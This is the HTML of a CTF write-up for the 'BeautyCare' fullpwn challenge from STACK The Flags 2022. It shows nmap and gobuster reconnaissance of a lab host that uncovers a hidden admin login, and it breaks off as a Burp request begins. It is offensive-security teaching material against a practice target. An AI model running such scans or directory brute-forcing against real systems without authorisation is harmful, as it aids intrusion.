<!DOCTYPE html><html lang="en" class="scroll-smooth"><head><link rel="apple-touch-icon" sizes="76x76" href="/static/favicons/apple-touch-icon.png?v=2"/><link rel="icon" type="image/png" sizes="32x32" href="/static/favicons/favicon-32x32.png?v=2"/><link rel="icon" type="image/png" sizes="16x16" href="/static/favicons/favicon-16x16.png?v=2"/><link rel="manifest" href="/static/favicons/site.webmanifest?v=2"/><link rel="mask-icon" href="/static/favicons/safari-pinned-tab.svg?v=2" color="#5bbad5"/><meta name="msapplication-TileColor" content="#da532c"/><meta name="theme-color" content="#ffffff"/><link rel="alternate" type="application/rss+xml" href="/feed.xml"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"/><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.11/dist/katex.min.css" integrity="sha384-Um5gpz1odJg5Z4HAmzPtgZKdTBHZdw8S29IecapCSB31ligYPhHQZMIlWLYQGVoc" crossorigin="anonymous"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin /><meta charSet="utf-8"/><script>!function(){try {var d=document.documentElement.classList;d.remove('light','dark');var e=localStorage.getItem('theme');d.add('dark');if("system"===e||(!e&&false)){var t="(prefers-color-scheme: dark)",m=window.matchMedia(t);m.media!==t||m.matches?d.add('dark'):d.add('light')}else if(e) d.add(e)}catch(e){}}()</script><meta content="width=device-width, initial-scale=1" name="viewport"/><title>STACK The Flags 2022 Open – Fullpwn</title><meta name="robots" content="follow, index"/><meta name="description" content="Fullpwn Solutions from STACK The Flags CTF"/><meta property="og:url" content="https://sekai.team/blog/stack-the-flags-2022/fullpwn/"/><meta property="og:type" content="article"/><meta property="og:site_name" content="Project SEKAI"/><meta property="og:description" content="Fullpwn Solutions from STACK The Flags CTF"/><meta property="og:title" content="STACK The Flags 2022 Open – Fullpwn"/><meta property="og:image" content="https://og-vercel-ruby.vercel.app/api/sekai?title=STACK+The+Flags+2022+Open+%E2%80%93+Fullpwn&amp;desc=Fullpwn+Solutions+from+STACK+The+Flags+CTF&amp;authors=ElleuchX1"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:site" content="https://twitter.com/ProjectSEKAIctf"/><meta name="twitter:title" content="STACK The Flags 2022 Open – Fullpwn"/><meta name="twitter:description" content="Fullpwn Solutions from STACK The Flags CTF"/><meta name="twitter:image" content="https://og-vercel-ruby.vercel.app/api/sekai?title=STACK+The+Flags+2022+Open+%E2%80%93+Fullpwn&amp;desc=Fullpwn+Solutions+from+STACK+The+Flags+CTF&amp;authors=ElleuchX1"/><meta property="article:published_time" content="2022-12-05T00:00:00.000Z"/><link rel="canonical" href="https://sekai.team/blog/stack-the-flags-2022/fullpwn/"/><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "Article",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://sekai.team/blog/stack-the-flags-2022/fullpwn"
  },
  "headline": "STACK The Flags 2022 Open – Fullpwn",
  "image": [
    {
      "@type": "ImageObject",
      "url": "https://og-vercel-ruby.vercel.app/api/sekai?title=STACK+The+Flags+2022+Open+%E2%80%93+Fullpwn&desc=Fullpwn+Solutions+from+STACK+The+Flags+CTF&authors=ElleuchX1"
    }
  ],
  "datePublished": "2022-12-05T00:00:00.000Z",
  "dateModified": "2022-12-05T00:00:00.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "ElleuchX1"
    }
  ],
  "publisher": {
    "@type": "Organization",
    "name": "Project SEKAI",
    "logo": {
      "@type": "ImageObject",
      "url": "https://sekai.team/static/images/fullLogo.svg"
    }
  },
  "description": "Fullpwn Solutions from STACK The Flags CTF"
}</script><meta name="next-head-count" content="20"/><link rel="preload" href="/_next/static/css/206f24680f6266ec.css" as="style"/><link rel="stylesheet" href="/_next/static/css/206f24680f6266ec.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-5cd94c89d3acac5f.js"></script><script src="/_next/static/chunks/webpack-09a75c9ee2bd415e.js" defer=""></script><script src="/_next/static/chunks/main-b8c3e234d7065a2c.js" defer=""></script><script src="/_next/static/chunks/pages/_app-b8cbc7cb85baf88e.js" defer=""></script><script src="/_next/static/chunks/framework-327e104994690a53.js" defer=""></script><script src="/_next/static/chunks/29107295-a2d0c8e72019a3ed.js" defer=""></script><script src="/_next/static/chunks/545-f1dc6b53ce85b08b.js" defer=""></script><script src="/_next/static/chunks/930-1296a6163e1e3cc6.js" defer=""></script><script src="/_next/static/chunks/pages/blog/%5B...slug%5D-9a47024c9df525b8.js" defer=""></script><script src="/_next/static/zs4rZRwOZcgSj8qsc8Zvy/_buildManifest.js" defer=""></script><script src="/_next/static/zs4rZRwOZcgSj8qsc8Zvy/_ssgManifest.js" defer=""></script><script src="/_next/static/zs4rZRwOZcgSj8qsc8Zvy/_middlewareManifest.js" defer=""></script><style data-href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap">@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuLyfMZs&skey=c491285d6722e4fa&v=v13) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuGKYMZs&skey=c491285d6722e4fa&v=v13) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=UcCO3FwrK3iLTeHuS_fvQtMwCp50KnMw2boKoduKmMEVuFuYMZs&skey=c491285d6722e4fa&v=v13) format('woff')}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:600;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2JL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa0ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2ZL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+1F00-1FFF}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa2pL7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa25L7W0Q5n-wU.woff2) format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Inter';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/inter/v13/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}</style></head><body class="antialiased text-black bg-white dark:bg-gray-900 dark:text-white"><div id="__next" data-reactroot=""><div class="max-w-3xl px-4 mx-auto sm:px-6 xl:max-w-5xl xl:px-0"><div class="flex flex-col justify-between h-screen"><header class="flex items-center justify-between py-10"><div><a aria-label="Visit home page" href="/"><div class="flex items-center justify-between"><div class="mr-3"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 468.7 215.63" height="80" width="auto"><defs><linearGradient id="fullLogo_svg__linear-gradient" x1="-7051.74" y1="5608.42" x2="-7051.74" y2="5392.1" gradientTransform="matrix(1 0 .15 -.99 6503.98 5547.9)" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#00e5ea"></stop><stop offset="1" stop-color="#00b5cc"></stop></linearGradient><linearGradient id="fullLogo_svg__linear-gradient-2" x1="1498.32" y1="4428.84" x2="1497.92" y2="4311.82" gradientTransform="matrix(1 0 0 -1 -1107.01 4435.41)" xlink:href="#fullLogo_svg__linear-gradient"></linearGradient><linearGradient id="fullLogo_svg__linear-gradient-3" x1="320.76" y1="14.17" x2="320.76" y2="47.97" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#0069a5"></stop><stop offset="1" stop-color="#003d6b"></stop></linearGradient><style>.fullLogo_svg__cls-1{fill:#fff}</style></defs><g id="fullLogo_svg__Project_SEKAI_Wide_White" data-name="Project SEKAI Wide White"><path class="fullLogo_svg__cls-1" d="M107 117.14v-4c11.93 0 22.15-8.62 23.76-20l12.91-91.63h4.06l-13 92.14c-1.92 13.4-13.84 23.49-27.73 23.49Z"></path><path class="fullLogo_svg__cls-1" d="M97.43 98.3a16 16 0 0 1-16.26-18.72l8.68-61.42A21.78 21.78 0 0 1 110.77 0a16.34 16.34 0 0 1 12.57 5.5A16.36 16.36 0 0 1 127 18.72l-8.69 61.42c-1.39 10.01-10.77 18.16-20.88 18.16ZM110.77 4a17.63 17.63 0 0 0-17 14.72l-8.64 61.42a12 12 0 0 0 12.3 14.16 17.65 17.65 0 0 0 16.95-14.72l8.69-61.42a12.41 12.41 0 0 0-2.75-10A12.4 12.4 0 0 0 110.77 4ZM186.94 5.42l.56-3.91H162.99l-13.5 95.44H174l.57-4h-20.46l5.85-41.36h20.46l.56-4h-20.45l5.96-42.17h20.45zM266.73 1.51h-31.01l-.55 3.91h14.2l-12.95 91.53h4.06l12.93-91.53h12.77l.55-3.91zM212.61 1.51a15.86 15.86 0 0 0-15.24 13.24l-9.86 69.48a11.69 11.69 0 0 0 2.76 9.34 12.57 12.57 0 0 0 9.18 4.43h.2c6.38 0 11.65-5.57 15.15-9.28L211.9 86c-3.06 3.23-7.67 8.11-12.38 8a8.54 8.54 0 0 1-6.21-3 7.73 7.73 0 0 1-1.84-6.18l9.86-69.48a11.83 11.83 0 0 1 11.28-9.9h13.91l.55-3.91ZM37.08 5.58a12 12 0 0 0-9.26-4.06H13.5L0 97h4.06l6.41-45.37h10.84a15.87 15.87 0 0 0 15.24-13.29l3.25-23a12 12 0 0 0-2.72-9.76Zm-1.24 9.17-3.26 23a11.74 11.74 0 0 1-11.27 9.8H11l6-42.13h10.85a7.94 7.94 0 0 1 8 9.33ZM75.09 5.58a12 12 0 0 0-9.26-4.06h-14.3L38 97h4l6.5-45.42h10L65 96.2h4l-6.6-45a16 16 0 0 0 12.16-12.86l3.25-23a12 12 0 0 0-2.72-9.76Zm-1.24 9.17-3.25 23a11.76 11.76 0 0 1-11.28 9.8H49.07L55 5.42h10.86a7.94 7.94 0 0 1 8 9.33ZM223.75 215.47h-4.06l13.5-95.43h4.05l-13.49 95.43zM65.83 215.63a14.49 14.49 0 0 1-11-4.65 11.3 11.3 0 0 1-2.68-9.15l1.31-8.59 4.4-2.34-1.76 11.52a7.24 7.24 0 0 0 1.75 5.93 10.47 10.47 0 0 0 8 3.28c6.42 0 12.26-4.39 13-9.8l5.42-38.33-28.77 15.27 6.37-46c1-7.3 8.65-13.24 17-13.24a14.52 14.52 0 0 1 11 4.65 11.36 11.36 0 0 1 2.68 9.14l-1.2 8.68-4.35 2.34 1.64-11.6a7.29 7.29 0 0 0-1.74-6 10.5 10.5 0 0 0-8-3.28c-6.42 0-12.26 4.39-13 9.79l-5.29 38.27 28.8-15.28-6.52 46.1c-1.11 7.35-8.73 13.29-17.06 13.29ZM174.15 120.04h-4.51l-26.9 51.72 7.31-51.72H146l-13.5 95.43h4.05l4.5-31.8 10.61-20.4 12.61 52.2h4.11l-13.91-57.6 19.68-37.83zM205 215.47h4l-2.29-94.87v-.56h-4l-29.31 95.43h4.18l9.82-32h16.83Zm-16.37-36L203 132.68l1.13 46.81ZM132.58 123.94l.56-3.91h-24.52l-13.49 95.44h24.51l.56-4H99.75l5.85-41.36h20.45l.57-4h-20.46l5.97-42.17h20.45z"></path><path style="fill:url(#fullLogo_svg__linear-gradient)" d="M279.69 1.51h8.87l-32.09 213.93h-8.87L279.69 1.51z"></path><path d="M393.81 14.88C396 .34 331.4 1.5 296.53 1.5L283.6 87.67c33.36-1.94 99.5-2 97.21 13.27-1.14 7.58-5.53 7.29-6.1 11.08-1.52 10.14 70.94 5.62 81.15 4.52L434 73.6l34.7-43.29c-17.47 1.81-82.47 4.94-81.11-4.15.73-4.87 5.41-5.56 6.22-11.28Z" style="fill:url(#fullLogo_svg__linear-gradient-2)"></path><path d="m324.34 13-5.8 25.24A9.73 9.73 0 0 0 312 36c-4.66 0-8.43 2.82-8.42 6.27s3.8 6.24 8.46 6.22c4 0 7.4-2.12 8.23-4.92 0-.14.06-.28.09-.42l3.48-15.5q9.18 2.06 9.72 5.26a9 9 0 0 1-1.27 6.22 10.78 10.78 0 0 0 5.7-8.81q.48-5.88-13.65-17.32Z" style="fill:url(#fullLogo_svg__linear-gradient-3)"></path></g></svg></div></div></a></div><div class="flex items-center text-base leading-5"><div class="hidden sm:block"><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/members/">Members</a><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/contests/">Contests</a><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/blog/">Blog</a><a class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100" href="/tags/">Tags</a><a target="_blank" rel="noopener noreferrer" href="https://ctf.sekai.team/" class="p-1 font-medium text-gray-900 sm:p-4 dark:text-gray-100">CTF 2023</a></div><div class="sm:hidden"><button type="button" class="w-8 h-8 py-1 ml-1 mr-1 rounded" aria-label="Toggle Menu"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="text-gray-900 dark:text-gray-100"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg></button><div class="fixed w-full h-full top-24 right-0 bg-gray-200 dark:bg-gray-800 opacity-95 z-10 transform ease-in-out duration-300 translate-x-full"><button type="button" aria-label="toggle modal" class="fixed w-full h-full cursor-auto focus:outline-none"></button><nav class="fixed h-full mt-8"><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/members/">Members</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/contests/">Contests</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/blog/">Blog</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/tags/">Tags</a></div><div class="px-12 py-4"><a target="_blank" rel="noopener noreferrer" href="https://ctf.sekai.team/" class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100">CTF 2023</a></div></nav></div></div></div></header><main class="mb-auto"><div class="max-w-3xl px-4 mx-auto sm:px-6 xl:max-w-5xl xl:px-0"><article><div class="xl:divide-y xl:divide-gray-200 xl:dark:divide-gray-700"><header class="pt-6 xl:pb-6"><div class="space-y-1 text-center"><dl class="space-y-10"><div><dt class="sr-only">Published on</dt><dd class="text-base font-medium leading-6 text-gray-500 dark:text-gray-400"><time dateTime="2022-12-05T00:00:00.000Z">Monday, 5 December 2022</time></dd></div></dl><div><h1 class="text-3xl font-extrabold leading-9 tracking-tight text-gray-900 dark:text-gray-100 sm:text-4xl sm:leading-10 md:text-5xl md:leading-14">STACK The Flags 2022 Open – Fullpwn</h1></div></div></header><div class="pb-8 divide-y divide-gray-200 xl:divide-y-0 dark:divide-gray-700 xl:grid xl:grid-cols-4 xl:gap-x-6" style="grid-template-rows:auto 1fr"><dl class="pt-6 pb-10 xl:pt-11 xl:border-b xl:border-gray-200 xl:dark:border-gray-700"><dt class="sr-only">Authors</dt><dd><ul class="flex justify-center space-x-8 xl:block sm:space-x-12 xl:space-x-0 xl:space-y-8"><li class="flex items-center space-x-2"><img src="https://www.gravatar.com/avatar/7713c4f4229ca2e9b9291755957a2e42?d=identicon&amp;s=256" width="38px" height="38px" alt="avatar" class="w-10 h-10 rounded-full"/><dl class="text-sm font-medium leading-5 whitespace-nowrap"><dt class="sr-only">Name</dt><dd class="text-gray-900 dark:text-gray-100">ElleuchX1</dd><dt class="sr-only">Twitter</dt><dd><span class="text-gray-500">Yeah exactly, the HTB guy</span></dd></dl></li></ul></dd></dl><div class="divide-y divide-gray-200 dark:divide-gray-700 xl:pb-0 xl:col-span-3 xl:row-span-2"><div class="pt-10 pb-8 prose dark:prose-dark max-w-none"><h2 id="beautycare-fullpwn-2000-points"><a href="#beautycare-fullpwn-2000-points" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>BeautyCare (Fullpwn, 2000 Points)</h2>
<h3 id="enumeration"><a href="#enumeration" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Enumeration</h3>
<p>We started with a simple <code>nmap</code> scan with the basic options:</p>
<div class="relative"><pre><code class="language-bash code-highlight"><span class="code-line">hcue@pjsk:~ » nmap -sC -sV -v <span class="token number">10.129</span>.228.37
</span><span class="code-line"><span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">8</span>.2p1 Ubuntu 4ubuntu0.5 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token number">80</span>/tcp <span class="token function">open</span>  http    nginx <span class="token number">1.18</span>.0 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
</span></code></pre></div>
<p>The output shows that ports 22 (SSH) and 80 (HTTP) are open on the target IP address. The SSH service is running OpenSSH version 8.2p1 on Ubuntu Linux. The HTTP service is running nginx version 1.18.0 on Ubuntu Linux.</p>
<p>Checking the Webserver running on port 80. We saw nothing interesting, pretty much everything is static and there is no leakage of a subdoamin/domain in the sources.</p>
<p><img src="/static/images/stack-the-flags-2022/beautycare-webpage.png" alt="Beautycare Webpage"/></p>
<p>Since there is no domain until now, we can proceed to fuzz for hidden directories with gobuster.</p>
<div class="relative"><pre><code class="language-bash code-highlight"><span class="code-line">hcue@pjsk:~ » gobuster <span class="token function">dir</span> -w /usr/share/seclists/Discovery/Web-Content/big.txt  -u http://10.129.228.37
</span><span class="code-line"><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
</span><span class="code-line">Gobuster v3.2.0-dev
</span><span class="code-line">by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
</span><span class="code-line"><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
</span><span class="code-line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://10.129.228.37
</span><span class="code-line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
</span><span class="code-line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
</span><span class="code-line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
</span><span class="code-line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
</span><span class="code-line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.2.0-dev
</span><span class="code-line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
</span><span class="code-line"><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
</span><span class="code-line"><span class="token number">2022</span>/12/05 02:50:25 Starting gobuster <span class="token keyword">in</span> directory enumeration mode
</span><span class="code-line"><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
</span><span class="code-line">/admin                <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">863</span><span class="token punctuation">]</span>
</span></code></pre></div>
<p>And we discovered that there is a hidden <code>/admin</code> endpoint which is a simple admin login page.</p>
<p><img src="/static/images/stack-the-flags-2022/admin-login.png" alt="Admin Login"/></p>
<p>I tried to login with some dummy/default credentials. But that didn’t help.</p>
<p>Checking Burp HTTP history for the requests:</p>
<div class="relative"><pre><code class="language-graphql code-highlight"><span class="code-line"><span class="token punctuation">{</span>
